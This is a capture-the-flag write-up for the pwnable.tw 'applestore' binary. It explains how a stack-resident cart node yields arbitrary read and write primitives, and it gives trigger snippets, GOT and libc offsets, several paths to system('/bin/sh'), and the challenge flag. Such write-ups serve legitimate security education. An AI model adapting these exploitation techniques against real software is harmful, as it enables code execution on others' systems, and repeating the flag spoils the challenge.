---
tags:
  - stack-pivoting
  - type-confusion
  - arbitrary-write
  - got-overwrite
platform: pwnable.tw
points: 300
arch: i386
libc: glibc-2.23
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "Inserting a stack-allocated item node into the heap-managed cart doubly-linked list enables an arbitrary write primitive during item deletion, allowing GOT overwrite to hijack control flow."
proof-of-concept: no
---

# applestore — pwnable.tw (300 pts)

[← Back to pwnable.tw Challenge Index](README.md)

> `nc chall.pwnable.tw 10104`
>
> Flag: `FLAG{I_th1nk_th4t_you_c4n_jB_1n_1ph0n3_8}`

## Challenge Overview

A 32-bit Apple device store simulator (i386, Partial RELRO, NX, Stack Canary, no PIE) built against glibc 2.23. The program maintains a shopping cart as a doubly-linked list of `malloc`'d device nodes. The user can list devices, add/remove items, view the cart, and checkout. When the cart total reaches exactly `$7174`, a special "iPhone 8" item is added — but its node lives **on the stack**, not the heap.

```
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000)
```

## Vulnerabilities

### V1 — iPhone 8 Node on Stack (Primary, Exploitable)

**Root Cause:** The `checkout` function checks if the cart total equals `$7174` (hex `0x1C06`). If so, it creates a device node as a **local stack variable** and inserts it into the linked list. When `checkout` returns, the node's memory is still referenced by the linked list but now overlaps with subsequent stack frames.

```c
// checkout (simplified)
void checkout() {
    // ...
    if (total == 7174) {
        // iPhone 8 node is a LOCAL variable — lives on stack!
        struct device iphone8;
        iphone8.name = "iPhone 8";
        iphone8.price = 1;
        insert(&myCart, &iphone8);  // inserts stack address into linked list
        printf("You are lucky! Here is a free iPhone 8!\n");
    }
    // iphone8 goes out of scope, but linked list still points to it
}
```

The Diophantine equation `199*a + 299*b + 399*c + 499*d = 7174` has multiple solutions. Common ones:
- 6 × iPhone 6 ($199) + 20 × iPhone 6 Plus ($299)
- 16 × iPhone 6 ($199) + 10 × iPad Mini 3 ($399)

**Impact:** After `checkout` returns, the iPhone 8 node in the linked list overlaps with the `handler`/`my_read` stack frame. Subsequent calls to `cart` (option 4) or `delete` (option 3) read user input into a buffer that overlaps the iPhone 8 node's fields. This gives the attacker direct control over the node's `name`, `price`, `next`, and `prev` pointers.

### V2 — Arbitrary Read via Fake Cart Node (Exploitable)

**Root Cause:** The `cart` function (option 4) reads a "y/n" confirmation with `my_read(buf, 0x15)`. The buffer `buf` is at `ebp-0x22`, and the iPhone 8 node is at a fixed offset on the same stack frame. By sending more than 2 bytes, the attacker overwrites the iPhone 8 node's `name` pointer.

```c
// cart (simplified) — "List Cart"
void cart() {
    char buf[0x15];           // ebp - 0x22
    // ... iPhone 8 node overlaps starting at buf+2
    my_read(buf, 0x15);      // "y\x00" + fake_name_ptr + ...
    if (buf[0] == 'y') {
        // iterates linked list, prints each node->name via printf
        for (node = myCart; node; node = node->next) {
            printf("%d: %s - $%d\n", i, node->name, node->price);
            //                            ^^^^^^^^^^
            //     attacker-controlled pointer → arbitrary read
        }
    }
}
```

**Trigger:**
```python
cart('y\x00' + p32(target_addr) + p32(0) + p32(0) + p32(0))
# Node 27 prints: "27: <4 bytes at target_addr> - $0"
```

**Impact:** Arbitrary 4-byte read at any address. Used to leak GOT entries (→ libc base) and `__environ` (→ stack address).

### V3 — Arbitrary Write via Doubly-Linked List Unlink (Exploitable)

**Root Cause:** The `delete` function (option 3) reads the item number with `my_read(buf, 0x15)`. The same stack overlap applies. When deleting the iPhone 8 node (item 27), the unlink operation writes through attacker-controlled `next` and `prev` pointers:

```c
// delete (simplified)
void delete() {
    char buf[0x15];           // ebp - 0x22
    my_read(buf, 0x15);      // "27" + fake_name + fake_price + fake_next + fake_prev
    // ...
    // Standard doubly-linked list unlink:
    node->prev->next = node->next;   // *(prev + 8) = next
    node->next->prev = node->prev;   // *(next + 12) = prev
}
```

**Trigger:**
```python
delete('27' + p32(name) + p32(price) + p32(next_val) + p32(prev_val))
# Writes: *(prev + 8) = next_val
#         *(next + 12) = prev_val
```

**Impact:** Write an arbitrary 4-byte value to an arbitrary address (with a reciprocal 4-byte side-effect write). Classic unsafe-unlink primitive.

### V4 — `my_read` Overlap with Stack Node (Enabler)

**Root Cause:** `my_read(buf, 0x15)` reads exactly 21 bytes. The buffer starts at `ebp-0x22`. The iPhone 8 node's `name` field starts at `ebp-0x20` (just 2 bytes into the buffer). This means any input longer than 2 bytes directly overwrites the node structure.

```
Stack layout in handler/cart/delete:
  ebp-0x22: buf[0]  buf[1]  ← "y\x00" or "27"
  ebp-0x20: name[0] name[1] name[2] name[3]   ← node->name (4 bytes)
  ebp-0x1c: price[0..3]                        ← node->price (4 bytes)
  ebp-0x18: next[0..3]                         ← node->next (4 bytes)
  ebp-0x14: prev[0..3]                         ← node->prev (4 bytes)
  ebp-0x10: ...
```

## Key Data Structures

### Device Node (16 bytes, doubly-linked list)

| Offset | Field | Type |
|--------|-------|------|
| `0x00` | `name` | `char *` (pointer to device name string) |
| `0x04` | `price` | `int` (price in dollars) |
| `0x08` | `next` | `struct device *` (next node in list) |
| `0x0c` | `prev` | `struct device *` (previous node in list) |

### Global State

| Address | Symbol | Description |
|---------|--------|-------------|
| `0x0804B068` | `myCart` | Head of cart linked list (next ptr) |
| `0x0804B06C` | `myCart+4` | Tail of cart linked list (prev ptr) |
| `0x0804B070` | `myCart+8` | First node pointer (used for heap base leak) |
| `0x0804B040` | `atoi@GOT` | GOT entry for `atoi` — primary overwrite target |
| `0x0804B028` | `puts@GOT` | GOT entry for `puts` |
| `0x0804B010` | `printf@GOT` | GOT entry for `printf` |
| `0x0804B00C` | `read@GOT` | GOT entry for `read` |

## Exploit Paths

All solutions share the same core primitives: trigger the iPhone 8 stack node (V1), use `cart` for arbitrary read (V2), and use `delete` for arbitrary write (V3). They diverge on the final control-flow hijack.

---

### Path A — EBP Overwrite → Stack Pivot to GOT → `atoi@GOT` = `system`

**Used by:** exp.py, solutions 138, 170, 1155, 1200, 1297, 1303, 1316, 1384, 1387, 1395, 1524, 1715, 10115, 11540, 13060, 14121, 14479, 16633, and many more (most common)

**Steps:**

1. **Buy items totaling $7174** and checkout → iPhone 8 node lands on stack.

2. **Leak libc base** via arbitrary read (V2):
   ```python
   # Read atoi@GOT (or puts/read/printf)
   cart('y\x00' + p32(atoi_got) + p32(0)*3)
   # Parse node 27's name → 4 bytes = atoi's runtime address
   libc_base = leaked_atoi - libc.symbols['atoi']
   ```

3. **Leak stack address** via `__environ`:
   ```python
   environ_addr = libc_base + libc.symbols['environ']
   stack_ptr = arbitrary_read(environ_addr)
   # handler's saved EBP = stack_ptr - fixed_offset (typically 0x104 or 260)
   ```

4. **Overwrite handler's saved EBP** via unlink (V3):
   ```python
   # Set handler's saved EBP to point near atoi@GOT
   # After handler's `leave; ret`, EBP becomes atoi_got+0x22
   # Next my_read(buf, 0x15) reads into ebp-0x22 = atoi_got
   delete('27' + p32(name) + p32(0) + p32(atoi_got + 0x22) + p32(saved_ebp - 8))
   ```

5. **Overwrite `atoi@GOT` with `system`**:
   ```python
   # handler reads the next menu choice into atoi@GOT
   sendline(p32(system_addr) + ';/bin/sh\x00')
   # or: sendline('sh\x00\x00' + p32(system_addr))
   # atoi(buf) becomes system(buf) → shell
   ```

**Key insight:** The `leave; ret` at the end of `delete`/`handler` does `mov esp, ebp; pop ebp`. By controlling the saved EBP, the next function's `my_read(ebp-0x22, ...)` writes directly into the GOT.

**Reliability:** 100% — no randomness involved, all addresses are deterministic after the leaks.

---

### Path B — `__malloc_hook` Overwrite via Byte-at-a-Time Unlink

**Used by:** Solution 1006, 1316 (variant)

**Steps:**

1. Same setup as Path A: buy items, checkout, get leaks.

2. **Delete items until only the iPhone 8 node remains** (items 1-26).

3. **Use the unlink primitive repeatedly** to write one byte at a time to `__malloc_hook`:
   ```python
   # Each unlink writes: *(addr-0xC) = byte_value
   # The "byte_value" comes from an address on the stack/BSS
   # that happens to hold the desired byte at its low position
   for offset in range(4):
       delete('1\x00' + p32(0)*2 + p32(malloc_hook - 0xC + offset) +
              p32(bss_addr_with_correct_byte))
   ```

4. **Trigger `malloc`** (e.g., `add(1)` → allocates a new device node) → `__malloc_hook` fires → one_gadget → shell.

**Reliability:** 100% but more complex — requires finding stack/BSS addresses that contain the right byte values.

---

### Path C — One-Gadget via EBP Pivot

**Used by:** Solutions 138, 1155, 1177, 1351

Same as Path A but instead of overwriting `atoi@GOT` with `system`, overwrites the return address or saved EBP to redirect to a one_gadget address:

```python
# Overwrite saved EBP to pivot stack near a controlled region
delete('27' + p32(0)*2 + p32(ebp - 12) + p32(fake_ebp))
# Next input placed on pivoted stack contains one_gadget address
sendline('6aaa' + p32(one_gadget_addr))
```

---

### Path D — `puts@GOT` Overwrite with Stack Pivot Gadget

**Used by:** Solution 1316 (variant)

1. **Use unlink to overwrite `puts@GOT`** with a `add esp, 0x1c; ret` gadget.
2. **Send payload on the next menu prompt** containing `system` address and `/bin/sh` argument.
3. When `puts` is called, it pivots the stack into the controlled buffer → executes `system("/bin/sh")`.

---

### Path E — Heap-Based Leak Chain

**Used by:** Solutions 1351, 1384, 10115

Instead of leaking the stack via `__environ`, this variant leaks through the heap:

1. **Leak heap base** via `myCart+8` (the first node pointer), or via `main_arena` bins.
2. **Walk the heap** to find the iPhone 8 node's stack address embedded in the last heap node's `next` pointer.
3. **Compute saved EBP** from the found stack address.

This avoids needing `__environ` but requires knowledge of the heap layout.

## Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Stack node in linked list | V1: checkout total == 7174 | Deterministic |
| Arbitrary 4-byte read | V2: cart with fake name ptr | Deterministic |
| Arbitrary 4-byte write | V3: delete unlink with fake next/prev | Deterministic |
| libc base leak | Read GOT entry via V2 | Deterministic |
| Stack address leak | Read `__environ` via V2 | Deterministic |
| GOT overwrite (`atoi`→`system`) | V3 unlink + EBP pivot | Deterministic |
| Code execution | `system("/bin/sh")` via GOT hijack | Deterministic |

## Offsets (pwnable.tw `libc_32.so.6`, glibc 2.23)

```python
# GOT addresses (no PIE)
atoi_got   = 0x0804B040
puts_got   = 0x0804B028
printf_got = 0x0804B010
read_got   = 0x0804B00C

# libc offsets
atoi      = 0x0002d050
system    = 0x0003a940
environ   = 0x001b1dbc
puts      = 0x0005f140
printf    = 0x00049020
read      = 0x000d5980
bin_sh    = 0x00158e8b
one_gadgets = [0x5f065, 0x5f066, 0x3a819]

# Stack offset: environ → handler's saved EBP
environ_to_ebp = 260  # (0x104)
```

## Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `100.md` | A | Leak via `__libc_start_main@GOT`, heap-based stack leak | Deletes all items first, then leaks via item 1 |
| `138.md` | C | Ruby exploit; one_gadget via EBP pivot | Uses `environ` for stack leak |
| `170.md` | A | Clean Python; `atoi@GOT → system` | Concise reference implementation |
| `1006.md` | B | Byte-at-a-time `__malloc_hook` overwrite | Uses stack/BSS bytes as write source |
| `1155.md` | C | Heap-based stack leak via `myCart+8` → heap → stack | One_gadget finish |
| `1177.md` | C | One_gadget via EBP overwrite after deleting 25 items | Clean one-gadget usage |
| `1200.md` | A | Uses `environ` for stack, unlink to pivot EBP to GOT | Standard path with `system(";sh")` |
| `1297.md` | A | Z3 for Diophantine; `atoi@GOT → system` via EBP pivot | Elegant and well-commented |
| `1303.md` | A | Two-stage stack leak (heap walk + environ) | Verbose but educational |
| `1316.md` | D | `puts@GOT → add_esp_0x1c_ret` stack pivot gadget | Byte-at-a-time GOT overwrite |
| `1351.md` | E | Heap leak via main_arena → heap walk for stack | Three-stage leak chain |
| `1384.md` | E | Heap-based leak chain through `myCart+8` | BSS node manipulation |
| `1387.md` | A | Straightforward; `read@GOT` leak, `environ` stack leak | Clean reference |
| `1395.md` | A | Uses `environ`; direct EBP overwrite to GOT+0x22 | Minimal exploit |
| `1524.md` | A | Uses heap walk to find stack node | Walks linked list for stack address |
| `1715.md` | A | Standard GOT hijack via EBP pivot | `system(";/bin/sh")` |
| `10115.md` | E | Heap leak via main_arena → stack address | Uses heap for stack leak |
| `11540.md` | A | Fixed-size 21-byte `my_read`; clever padding | Uses `environ` |
| `13060.md` | A | Multi-byte leak function; heap-walk for stack | Thorough leak implementation |
| `14121.md` | A | Standard; uses `puts@GOT` for libc, `environ` for stack | Clean pwntools usage |
| `16633.md` | A | 19×iPhone6 + 6×iPadAir + 1×iPadMini Diophantine | Standard EBP pivot |

## Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (pure socket, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/applestore` | Challenge binary (i386, stripped) |
| `artifacts/libc_32.so.6` | Remote libc (glibc 2.23, i386) |
| `solution/*.md` | Community write-ups (167 solutions) |
